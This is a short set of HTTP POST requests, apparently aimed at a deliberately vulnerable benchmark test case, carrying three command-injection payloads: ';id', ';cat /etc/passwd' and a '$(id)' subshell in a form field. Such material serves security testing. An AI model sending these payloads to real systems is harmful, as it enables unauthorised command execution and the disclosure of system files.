# Command injection - execute 'id' command
POST /benchmark/cmdi-00/BenchmarkTest00167
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00167=test;id

# Command injection - read /etc/passwd
POST /benchmark/cmdi-00/BenchmarkTest00167
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00167=test;cat /etc/passwd

# Command injection - using subshell
POST /benchmark/cmdi-00/BenchmarkTest00167
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00167=$(id)